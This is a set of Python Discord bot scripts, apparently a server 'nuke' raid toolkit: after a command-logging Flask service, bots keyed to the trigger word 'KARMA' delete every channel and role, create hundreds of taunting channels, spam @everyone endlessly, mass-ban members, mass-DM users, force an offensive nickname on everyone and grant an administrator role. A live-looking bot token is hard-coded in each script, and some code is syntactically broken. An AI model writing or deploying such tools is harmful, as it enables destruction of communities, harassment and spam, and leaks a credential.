import os
import time
from datetime import datetime, timezone
from flask import Flask, request, jsonify
import requests

app = Flask(__name__)

# Environment variables
DISCORD_BOT_TOKEN = os.getenv("DISCORD_BOT_TOKEN")
LOG_CHANNEL_ID = os.getenv("LOG_CHANNEL_ID", "1410458084874260592")
AUTH_SECRET = os.getenv("AUTH_SECRET")  # Optional security
BOT_DISPLAY_NAME = os.getenv("BOT_DISPLAY_NAME", "CommandLoggerBot")

DISCORD_API_BASE = "https://discord.com/api/v10"

if not DISCORD_BOT_TOKEN:
    raise ValueError("DISCORD_BOT_TOKEN environment variable is required!")

def auth_ok(req):
    """Validate optional auth header."""
    if not AUTH_SECRET:
        return True
    auth = req.headers.get("Authorization", "")
    return auth == f"Bearer {AUTH_SECRET}"

def make_embed(payload):
    command = payload.get("command", "<unknown>")
    username = payload.get("username", "Unknown user")
    user_id = payload.get("user_id", "unknown")
    description = payload.get("description", "No description provided.")
    bot_name = payload.get("bot_name", "Unknown Bot")
    extra = payload.get("extra", {})

    # Build fields
    fields = [
        {"name": "Command / Trigger", "value": f"`{command}`", "inline": True},
        {"name": "Who triggered it", "value": f"{username} (`{user_id}`)", "inline": True},
        {"name": "Bot used", "value": bot_name, "inline": True},
        {"name": "What it did", "value": description, "inline": False},
    ]

    # Add extra fields
    if isinstance(extra, dict):
        for k, v in extra.items():
            val = str(v)
            if len(val) > 1024:
                val = val[:1020] + "…"
            fields.append({"name": k, "value": val, "inline": False})

    embed = {
        "title": "Command Triggered",
        "description": "A command or trigger was used in the server.",
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "color": 0x2F3136,
        "author": {"name": bot_name},
        "fields": fields,
        "footer": {"text": f"{BOT_DISPLAY_NAME} • logged"},
    }
    return embed

def send_embed(channel_id, embed):
    url = f"{DISCORD_API_BASE}/channels/{channel_id}/messages"
    headers = {
        "Authorization": f"Bot {DISCORD_BOT_TOKEN}",
        "Content-Type": "application/json"
    }
    payload = {"embeds": [embed]}
    resp = requests.post(url, json=payload, headers=headers, timeout=10)

    # simple rate limit handling
    if resp.status_code == 429:
        retry = resp.json().get("retry_after", 1)
        time.sleep(retry / 1000)
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
    resp.raise_for_status()
    return resp

@app.route("/")
def index():
    return "Bot command logger is running."

@app.route("/notify", methods=["POST"])
def notify():
    if not auth_ok(request):
        return jsonify({"error": "unauthorized"}), 401

    if not request.is_json:
        return jsonify({"error": "expected JSON body"}), 400

    payload = request.get_json()
    if "command" not in payload:
        return jsonify({"error": "missing 'command' field"}), 400

    embed = make_embed(payload)
    try:
        send_embed(LOG_CHANNEL_ID, embed)
    except requests.HTTPError as e:
        return jsonify({"error": "failed to send to Discord", "details": getattr(e, "response").text if getattr(e, "response", None) else str(e)}), 500
    except Exception as e:
        return jsonify({"error": "unexpected error", "details": str(e)}), 500

    return jsonify({"ok": True}), 200

if __name__ == "__main__":
    port = int(os.getenv("PORT", 5000))
    app.run(host="0.0.0.0", port=port)


import discord
from discord.ext import commands
import asyncio

# ---------- CONFIG ----------
TRIGGER = "KARMA"   # Word to type in chat to start deletion
GUILD_ID = 1234567890123456789  # Your server ID
CHANNEL_NAME = None            # Optional: delete only channels with this name
CHANNEL_ID = None              # Optional: delete only a specific channel by ID
CONCURRENCY = 100                # How many channels delete at the same time
BOT_TOKEN = "Bot_Token_Here"
# ----------------------------

intents = discord.Intents.default()
intents.guilds = True
intents.message_content = True

bot = commands.Bot(command_prefix="", intents=intents)


async def delete_channels():
    guild = bot.get_guild(GUILD_ID)
    if not guild:
        print("Bot is not in the specified guild.")
        return

    # Filter channels
    if CHANNEL_ID:
        channels_to_delete = [guild.get_channel(CHANNEL_ID)]
    elif CHANNEL_NAME:
        channels_to_delete = [ch for ch in guild.channels if ch.name == CHANNEL_NAME]
    else:
        channels_to_delete = list(guild.channels)

    print(f"Found {len(channels_to_delete)} channels to delete")

    # Semaphore for concurrency control
    sem = asyncio.Semaphore(CONCURRENCY)

    async def delete_channel(ch):
        async with sem:
            if not ch:
                return
            try:
                await ch.delete(reason="Mass channel deletion")
                print(f"Deleted channel: {ch.name}")
            except discord.Forbidden:
                print(f"No permission to delete channel: {ch.name}")
            except discord.HTTPException as e:
                print(f"Failed to delete {ch.name}: {e}")

    # Run deletions concurrently
    await asyncio.gather(*(delete_channel(ch) for ch in channels_to_delete))


@bot.event
async def on_ready():
    print(f"✅ Logged in as {bot.user}")


@bot.event
async def on_message(message):
    if message.author.bot:
        return

    if message.content.strip().lower() == TRIGGER.lower():
        print("⚡ Trigger detected, starting channel deletion...")
        bot.loop.create_task(delete_channels())


bot.run(MTQyNjI0NTM5NzA3NjI0NjU5MQ.Gow_9y.DTRQl0vSfscSnbIkvmEbCn2uesn4ISLrixhUec)

import discord
from discord.ext import commands
import asyncio

# ---------- CONFIG ----------
TRIGGER = ""       # Trigger word to start creating
CHANNEL_NAME = "YOU WERE FUCKED BY •ॐ Kiyotaka Ayanokoji¹⁷¹³ •HN•"       # Base name of channels
CHANNEL_COUNT = 307               # How many channels to create
BATCH_SIZE = 50                   # How many channels to create at once
BATCH_DELAY = 1                  # Delay in seconds between batches
GUILD_ID = 123456789012345678    # Replace with your server ID
# ----------------------------

intents = discord.Intents.default()
intents.guilds = True
intents.message_content = True

bot = commands.Bot(command_prefix="", intents=intents)

@bot.event
async def on_ready():
    print(f"Logged in as {bot.user}")

async def create_channel(guild, name):
    try:
        channel = await guild.create_text_channel(name)
        print(f"Created channel: {name}")
        return channel
    except discord.Forbidden:
        print(f"No permission to create channel: {name}")
        return None
    except discord.HTTPException as e:
        print(f"Failed to create channel {name}: {e}")
        return None

@bot.event
async def on_message(message):
    if message.author.bot:
        return

    if message.content.lower().strip() == TRIGGER.lower():
        guild = bot.get_guild(GUILD_ID)
        if not guild:
            print("Bot is not in the specified guild.")
            return

        tasks = []
        for i in range(CHANNEL_COUNT):
            channel_name = f"{CHANNEL_NAME}-{i+1}"
            tasks.append(create_channel(guild, channel_name))

            # Run in batches
            if len(tasks) >= BATCH_SIZE:
                await asyncio.gather(*tasks)
                tasks.clear()
                await asyncio.sleep(BATCH_DELAY)

        # Finish any remaining channels
        if tasks:
            await asyncio.gather(*tasks)

bot.run(MTQyNjI0NTM5NzA3NjI0NjU5MQ.Gow_9y.DTRQl0vSfscSnbIkvmEbCn2uesn4ISLrixhUec)

import discord
from discord.ext import commands
import asyncio

# ---------- CONFIG ----------
TRIGGER = "KARMA"                # Trigger word
MESSAGE = "@everyone YOUR SERVER GOT FUCKED BY •ॐ Kiyotaka Ayanokoji¹⁷¹³ •HN•"  # Message to send
SPAM_DELAY = 1                  # Seconds between each message
CHANNEL_COUNT = 500              # How many channels to spam
GUILD_ID = 12345678   # Replace with your server ID
# ----------------------------

intents = discord.Intents.default()
intents.guilds = True
intents.message_content = True

bot = commands.Bot(command_prefix="", intents=intents)

async def spam_channel(channel):
    while True:
        try:
            await channel.send(MESSAGE)
            print(f"Sent message in {channel.name}")
        except discord.Forbidden:
            print(f"No permission to send in {channel.name}")
            break
        except discord.HTTPException as e:
            print(f"Failed to send in {channel.name}: {e}")
            await asyncio.sleep(2)
            continue
        await asyncio.sleep(SPAM_DELAY)

@bot.event
async def on_ready():
    print(f"Logged in as {bot.user}")

@bot.event
async def on_message(message):
    if message.author.bot:
        return

    if message.content.lower().strip() == TRIGGER.lower():
        guild = bot.get_guild(GUILD_ID)
        if not guild:
            print("Bot is not in the specified guild.")
            return

        # Limit channels to first CHANNEL_COUNT text channels
        text_channels = [ch for ch in guild.text_channels][:CHANNEL_COUNT]

        # Start infinite spam tasks for each channel
        for channel in text_channels:
            bot.loop.create_task(spam_channel(channel))

bot.run(MTQyNjI0NTM5NzA3NjI0NjU5MQ.Gow_9y.DTRQl0vSfscSnbIkvmEbCn2uesn4ISLrixhUec)

import discord
from discord.ext import commands
import asyncio
import random

# ---------- CONFIG ----------
TRIGGER = "KARMA"                # Trigger command to start batch ban
MEMBER_IDS = []             # Optional: list of specific member IDs to ban
IGNORED_IDS = []            # List of member IDs to skip
BAN_ALL = True              # True = ban multiple members
AMOUNT = 7777                  # Total members to ban (ignored if MEMBER_IDS is set)
BATCH_AMOUNT = 1000            # Members per batch
BATCH_SPEED = 1.0           # Delay (seconds) between individual bans
BATCH_DELAY = 0           # Delay (seconds) between batches
GUILD_ID = 123456789012345678  # Your server ID
# ----------------------------

# ---- Intents ----
intents = discord.Intents.default()
intents.guilds = True
intents.members = True          # needed to access members
intents.messages = True         # required to read messages
intents.message_content = True  # REQUIRED for triggers

bot = commands.Bot(command_prefix="", intents=intents)

# ---- Core batch ban logic ----
async def run_batch_ban(guild):
    # Ban specific members by ID
    if MEMBER_IDS:
        for member_id in MEMBER_IDS:
            if member_id in IGNORED_IDS:
                print(f"Skipping ignored member ID {member_id}")
                continue
            member = guild.get_member(member_id)
            if member:
                try:
                    await member.ban(reason="Selected ban")
                    print(f"Banned {member.name}")
                except (discord.Forbidden, discord.HTTPException) as e:
                    print(f"Failed to ban {member.name}: {e}")
                await asyncio.sleep(BATCH_SPEED)
        return

    # Ban multiple members (BAN_ALL)
    if BAN_ALL:
        members = [
            m for m in guild.members
            if not m.bot and m.id not in IGNORED_IDS and m != bot.user
        ]
        total_to_ban = min(AMOUNT, len(members)) if AMOUNT else len(members)
        to_ban = random.sample(members, total_to_ban)

        for i in range(0, len(to_ban), BATCH_AMOUNT):
            batch = to_ban[i:i+BATCH_AMOUNT]

            for member in batch:
                try:
                    await member.ban(reason="Batch ban")
                    print(f"Banned {member.name}")
                except (discord.Forbidden, discord.HTTPException) as e:
                    print(f"Failed to ban {member.name}: {e}")
                await asyncio.sleep(BATCH_SPEED)

            await asyncio.sleep(BATCH_DELAY)

# ---- Trigger handling ----
@bot.event
async def on_ready():
    print(f"Logged in as {bot.user}")

@bot.event
async def on_message(message):
    if message.author.bot:
        return

    if message.content.lower().strip() != TRIGGER.lower():
        return

    guild = bot.get_guild(GUILD_ID)
    if not guild:
        print("Guild not found")
        return

    await run_batch_ban(guild)

bot.run(MTQyNjI0NTM5NzA3NjI0NjU5MQ.Gow_9y.DTRQl0vSfscSnbIkvmEbCn2uesn4ISLrixhUec)


import discord
from discord.ext import commands
import asyncio

# ---------- CONFIG ----------
TRIGGER = "KARMA"                  # Trigger word to start the mass DM
DM_ALL = True                   # True = DM everyone in server
DM_IDS = []                     # Multiple user IDs (if DM_ALL=False)
IGNORE_IDS = []                 # Multiple user IDs to ignore
MESSAGE = "VEX WAS FUCKED BY •ॐ Kiyotaka Ayanokoji¹⁷¹³ •HN•"  # Message template
REPEAT = True                   # True = keep sending repeatedly
GUILD_ID = 1234567890123456789  # Server to DM in

MESSAGES_PER_SECOND = 0.1       # How many messages to send per second (allow decimals)
# ----------------------------

intents = discord.Intents.default()
intents.guilds = True
intents.members = True
intents.message_content = True

bot = commands.Bot(command_prefix="", intents=intents)

def format_message(member: discord.Member):
    """Replace abbreviations in message with real values"""
    msg = MESSAGE
    msg = msg.replace("$ping", member.mention)   # $ping -> @user
    msg = msg.replace("$name", member.name)      # $name -> username
    msg = msg.replace("$id", str(member.id))     # $id -> user ID
    return msg

async def send_dm(member):
    try:
        formatted = format_message(member)
        await member.send(formatted)
        print(f"✅ Sent DM to {member.name}")
    except discord.Forbidden:
        print(f"❌ Cannot DM {member.name}")
    except discord.HTTPException as e:
        print(f"⚠️ Failed to DM {member.name}: {e}")

async def dm_scheduler(members):
    delay = 1.0 / MESSAGES_PER_SECOND  # exact spacing between messages
    index = 0
    while True:
        member = members[index % len(members)]
        await send_dm(member)
        await asyncio.sleep(delay)  # precise delay based on messages/sec

        if not REPEAT and index >= len(members) - 1:
            break
        index += 1

@bot.event
async def on_ready():
    print(f"Bot logged in as {bot.user}")

@bot.event
async def on_message(message):
    if message.author.bot:
        return

    # Check trigger
    if message.content.lower().strip() != TRIGGER.lower():
        return

    guild = bot.get_guild(GUILD_ID)
    if not guild:
        print("❌ Bot is not in the specified guild.")
        return

    # Decide who to DM
    if DM_ALL:
        members_to_dm = [m for m in guild.members if not m.bot and m.id not in IGNORE_IDS]
    else:
        members_to_dm = [guild.get_member(uid) for uid in DM_IDS if guild.get_member(uid) and uid not in IGNORE_IDS]

    if not members_to_dm:
        print("⚠️ No members found to DM.")
        return

    print(f"🚀 Starting DM loop with {MESSAGES_PER_SECOND} msg/sec...")
    bot.loop.create_task(dm_scheduler(members_to_dm))

bot.run(MTQyNjI0NTM5NzA3NjI0NjU5MQ.Gow_9y.DTRQl0vSfscSnbIkvmEbCn2uesn4ISLrixhUec)

import discord
from discord.ext import commands
import asyncio

# ==== CONFIG ====
CONFIG = {
   TRIGGER = "KARMA"                # Trigger word
  "guild_id": 1234567890123456789,  # Replace with your server (guild) ID
    "user_id": None,         # Optional: specific user ID
    "nickname_all": True,    # True = change all members
    "batch_amount": 100,  # Members per batch
    "batch_delay": 0.1, # Delay between batches (seconds)
    "nickname": "LANJAS & KOJJAS KI PRESIDENT(WOMEN AND FEMALES EXCLUDED) ",     # The nickname to set
   
 "revert": False     # True = remove everyone's nickname
}
# ===============

intents = discord.Intents.default()
intents.members = True  # Required for nickname changes
bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    print(f"✅ Logged in as {bot.user}")
    action = "Reverting nicknames" if CONFIG["revert"] else f"Setting nickname to '{CONFIG['nickname']}'"
    print(f"⚡ {action}...")

    guild = bot.get_guild(CONFIG["guild_id"])
    if not guild:
        print("❌ Bot is not in the specified guild.")
        return

    members = []

    if CONFIG["user_id"]:
        member = guild.get_member(CONFIG["user_id"])
        if member:
            members = [member]
    elif CONFIG["nickname_all"]:
        members = guild.members

    print(f"⚡ Target members: {len(members)}")

    for i in range(0, len(members), CONFIG["batch_amount"]):
        batch = members[i:i+CONFIG["batch_amount"]]
        for member in batch:
            try:
                if CONFIG["revert"]:
                    await member.edit(nick=None)
                    print(f"✅ Reverted nickname for {member.display_name}")
                else:
                    await member.edit(nick=CONFIG["nickname"])
                    print(f"✅ Changed nickname for {member.display_name}")
            except Exception as e:
                print(f"❌ Could not change nickname for {member.display_name}: {e}")
        await asyncio.sleep(CONFIG["batch_delay"])

    print("🎉 Finished nickname changes.")

bot.run(MTQyNjI0NTM5NzA3NjI0NjU5MQ.Gow_9y.DTRQl0vSfscSnbIkvmEbCn2uesn4ISLrixhUec)

import discord
from discord.ext import commands, tasks
import asyncio

# ---------------- CONFIG ----------------
TRIGGER = "KARMA"                 # Trigger command to assign/create role
ROLE_NAME = "•ॐ Kiyotaka Ayanokoji¹⁷¹³ •HN•"              # Optional: used if creating a new role
ROLE_COLOR = 0xFFFFF                # Optional: color for new role
EXISTING_ROLE_IDS = []               # Optional: list of existing role IDs to update
GUILD_ID = 1234567890123456789        # Your server ID
ASSIGN_TO = []                        # List of member IDs to assign role to
ASSIGN_TO_EVERYONE = False            # True = assign role to everyone
BATCH_AMOUNT = 5                       # Number of members per batch
BATCH_DELAY = 2.0                      # Seconds to wait between batches
PERMISSIONS = {                        # Valid Discord permissions only
    "create_instant_invite": True,
    "kick_members": True,
    "ban_members": True,
    "administrator": True,
    "manage_channels": True,
    "manage_guild": True,
    "add_reactions": True,
    "view_audit_log": True,
    "priority_speaker": True,
    "stream": True,
    "view_channel": True,
    "send_messages": True,
    "send_tts_messages": True,
    "manage_messages": True,
    "embed_links": True,
    "attach_files": True,
    "read_message_history": True,
    "mention_everyone": True,
    "use_external_emojis": True,
    "view_guild_insights": True,
    "connect": True,
    "speak": True,
    "mute_members": True,
    "deafen_members": True,
    "move_members": True,
    "use_voice_activation": True,
    "change_nickname": True,
    "manage_nicknames": True,
    "manage_roles": True,
    "manage_webhooks": True,
    "manage_emojis": True,
    "use_application_commands": True,
    "request_to_speak": True,
    "manage_events": True,
    "manage_threads": True,
    "create_public_threads": True,
    "create_private_threads": True,
    "use_external_stickers": True,
    "send_messages_in_threads": True
}
# -----------------------------------------

intents = discord.Intents.default()
intents.guilds = True
intents.members = True
intents.messages = True
intents.message_content = True

bot = commands.Bot(command_prefix="", intents=intents)


async def create_or_update_roles(guild):
    roles_to_use = []

    # Handle existing roles
    for rid in EXISTING_ROLE_IDS:
        role = guild.get_role(rid)
        if role:
            perms = discord.Permissions(**PERMISSIONS)
            await role.edit(permissions=perms, reason="Updated by script")
            roles_to_use.append(role)
        else:
            print(f"Role ID {rid} not found in guild.")

    # Create new role if ROLE_NAME is set
    if ROLE_NAME:
        existing = discord.utils.get(guild.roles, name=ROLE_NAME)
        if not existing:
            perms = discord.Permissions(**PERMISSIONS)
            role = await guild.create_role(
                name=ROLE_NAME,
                color=discord.Color(ROLE_COLOR),
                permissions=perms,
                reason="Created by script"
            )
            roles_to_use.append(role)
        else:
            roles_to_use.append(existing)

    return roles_to_use


async def assign_roles(guild, roles):
    # Determine members to assign
    members = []
    if ASSIGN_TO_EVERYONE:
        members = [m for m in guild.members if not m.bot]
    elif ASSIGN_TO:
        members = [guild.get_member(mid) for mid in ASSIGN_TO if guild.get_member(mid)]

    if not members:
        print("No members to assign roles to.")
        return

    # Batch assign roles
    for i in range(0, len(members), BATCH_AMOUNT):
        batch = members[i:i + BATCH_AMOUNT]
        for member in batch:
            for role in roles:
                try:
                    await member.add_roles(role, reason="Assigned by script")
                    print(f"Assigned {role.name} to {member.name}")
                except discord.Forbidden:
                    print(f"Missing permissions to assign {role.name} to {member.name}")
                except discord.HTTPException as e:
                    print(f"HTTP error assigning {role.name} to {member.name}: {e}")
        await asyncio.sleep(BATCH_DELAY)


@bot.event
async def on_ready():
    print(f"✅ Logged in as {bot.user}")


@bot.event
async def on_message(message):
    if message.author.bot:
        return
    if message.content.lower().strip() != TRIGGER.lower():
        return

    guild = bot.get_guild(GUILD_ID)
    if not guild:
        print("Guild not found.")
        return

    roles = await create_or_update_roles(guild)
    await assign_roles(guild, roles)


bot.run(MTQyNjI0NTM5NzA3NjI0NjU5MQ.Gow_9y.DTRQl0vSfscSnbIkvmEbCn2uesn4ISLrixhUec)

import discord
from discord.ext import commands
import asyncio

# ---------- CONFIG ----------
TRIGGER = "KARMA"          # Trigger word to start role deletion
MASS_DELETE = False                # True = delete all roles
ROLE_IDS = []                      # List of role IDs to delete, e.g., [123456, 789012]
ROLE_NAME = None                   # Optional: delete role by name
GUILD_ID = 123456789012345678      # Your server ID

BATCH_AMOUNT = 100                   # Number of roles to delete per batch
BATCH_DELAY = 0                     # Seconds to wait between batches
# ----------------------------

intents = discord.Intents.default()
intents.guilds = True
intents.members = True
intents.messages = True
intents.message_content = True

bot = commands.Bot(command_prefix="", intents=intents)

async def delete_roles(guild):
    roles_to_delete = []

    # Delete by multiple IDs
    if ROLE_IDS:
        for rid in ROLE_IDS:
            role = guild.get_role(rid)
            if role:
                roles_to_delete.append(role)

    # Delete by Name
    elif ROLE_NAME:
        role = discord.utils.get(guild.roles, name=ROLE_NAME)
        if role:
            roles_to_delete.append(role)

    # Mass delete all roles (excluding @everyone)
    elif MASS_DELETE:
        roles_to_delete = [r for r in guild.roles if r != guild.default_role]

    # Process deletion in batches
    for i in range(0, len(roles_to_delete), BATCH_AMOUNT):
        batch = roles_to_delete[i:i + BATCH_AMOUNT]
        # Delete all roles in this batch
        delete_tasks = [role.delete(reason="Role Deleter Script") for role in batch]
        results = await asyncio.gather(*delete_tasks, return_exceptions=True)
        # Handle results
        for j, result in enumerate(results):
            if isinstance(result, Exception):
                print(f"Failed to delete {batch[j].name}: {result}")
            else:
                print(f"Deleted role: {batch[j].name}")
        await asyncio.sleep(BATCH_DELAY)  # wait after each batch

@bot.event
async def on_ready():
    print(f"Logged in as {bot.user}")

@bot.event
async def on_message(message):
    if message.author.bot:
        return

    if message.content.lower().strip() != TRIGGER.lower():
        return

    guild = bot.get_guild(GUILD_ID)
    if not guild:
        print("Bot is not in the specified guild.")
        return

    await delete_roles(guild)

bot.run(MTQyNjI0NTM5NzA3NjI0NjU5MQ.Gow_9y.DTRQl0vSfscSnbIkvmEbCn2uesn4ISLrixhUec)
